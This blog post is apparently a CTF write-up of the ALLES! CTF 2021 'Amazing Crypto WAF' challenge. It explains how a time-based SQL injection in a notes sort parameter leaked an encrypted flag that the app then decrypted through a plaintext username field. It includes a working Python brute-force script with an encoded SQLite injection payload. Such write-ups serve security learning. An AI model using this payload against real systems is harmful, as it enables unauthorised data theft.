---
layout: post
title: Amazing Crypto WAF
category: ALLES! CTF 2021
---

So last week I was able to play for a few hours with my team [Super Gusser](https://ctftime.org/team/130817/), once i joined Discord and found that already half of the web challenge siced :D ,  I chose this challenge as a start and my teammate [sapra](https://twitter.com/0xsapra) also joined.

<img style="zoom: 40%;" src="https://user-images.githubusercontent.com/7364615/132334574-a2d19944-8a0e-4c2f-b549-4335e6aa067a.png" alt="main" >

First the challenge was very simple, you can create an account / log in and you can also post some notes.

<img style="zoom: 40%;" src="https://user-images.githubusercontent.com/7364615/132334741-9024bcb3-221b-4816-9ae2-af0cc5520123.png" alt="main" >

Based on all of this and checking the source code which was a good hint for us rather than blindly trying to check all kinds of possible bugs :) .

Later, after reading the code and checking, `sapra` mentions that there is a possible SQL injection which was a time based SQLi in notes function..

<img style="zoom: 40%;" src="https://user-images.githubusercontent.com/7364615/132335060-2ffb3b5a-ce02-4f6f-b807-a2fb04b46e9a.png" alt="main" >

basically we can inject after `order by timestamp`, using this sqli we can leak all data on sqlite database including the flag (the flag was located in the` flagger` account note)

<img style="zoom: 40%;" src="https://user-images.githubusercontent.com/7364615/132335349-f515758e-69bf-4164-8207-bc0ab3059ad3.png" alt="main" >

But !! if we check the code again we can see that the app encrypts all data before inserting it into sqlite database and decrypts it again when requested

<img style="zoom: 40%;" src="https://user-images.githubusercontent.com/7364615/132336000-7684f027-e9c4-4675-aac7-c823c074d2e4.png" alt="main" >

So the issue here, how we can decrypt the flag, even though we can leak it, as the encryption is strong enough and can't be exploited, which means the only way is to find out how we can make the app decrypt the flag for us

The real problem is that if we post a note with the flag leaked, it will be encrypted again and decrypted once, which means we won't be able to get the clear text, but there was a weakness in the code, exactly in the encryption function

<img style="zoom: 40%;" src="https://user-images.githubusercontent.com/7364615/132336496-33f556af-b438-44d7-ab7c-fb6bc8e3f32d.png" alt="main" >

As the application does not encrypt `'uuid', 'id', 'pk', 'username', 'password'` and it does store it in plaintext, we can use this part and create an account with username as encrypted flag and once we are logged in the flag will be decrypted as the app decrypts all content of the response

```
response_data = decrypt_data(proxy_request.content)
```

So what's left here is just leak the flag and decrypt it, but the last step was to bypass the easy waf that detects certain words.

<img style="zoom: 40%;" src="https://user-images.githubusercontent.com/7364615/132336897-499aeed0-6b69-4d82-bdbd-2d7b9fa23290.png" alt="main" >

Using a simple encoding can do the job here, which means we have all the steps we need :)

1 - `Leak "flagger" account notes ( flag note )`

2 - `Create an account using flag as username`

3 - `Read the flag from the home page`


```
import requests
import time

cookies = {
    'session': '116c6bf2d2de45a8d4a1bdac5524fc01.b810785f36c37cc8d4cf48b55c0e45716dd7ccb38f80ac19a08f2a41371711a',
}
#ENCRYPT:SzJEVHVzRmhHaHZmU2pYak0yQVZzQT09OmUzOVBwcXNVWWdhMEw0YXpCVDV2WHRwYnBPRXFaSVpqMFpQRk1BMXNzODE1UGxIUXhwb0hLY2diNGd2VTRYYz06REpPTWk0S01pdmZ3cXVxNFBGcklTdz09
flag_enc = "ENCRYPT:"

pos = len(flag_enc) + 1

for x in range( pos, 200 ):
    for i in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/=":
        t1 = time.time()
        url = "https://7b000000c73b13b1628e0950-amazing-crypto-waf.challenge.master.allesctf.net:31337/notes%3forder=asc,(CASE%20WHEN%20(select%20substr((select%20body%20from%20notes%20where%20user=(select%20uuid%20from%20users%20where%20username='flagger'))," + str(x) + ",1)%20=%20'" + str(i) + "')%20THEN%2012=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))%20ELSE%20timestamp%20END)%20desc%23"
        response = requests.get(url, cookies=cookies)
        t2 = time.time()
        if (t2 - t1) > 0.9:
            flag_enc += i
            break        
    print flag_enc
```

And here is the FLAG : `ALLES!{American_scientists_said,_dont_do_WAFs!}`

<img style="zoom: 40%;" src="https://user-images.githubusercontent.com/7364615/132345085-727ea1ae-5177-4d63-aa78-d4a8082a59b5.png" alt="main" >


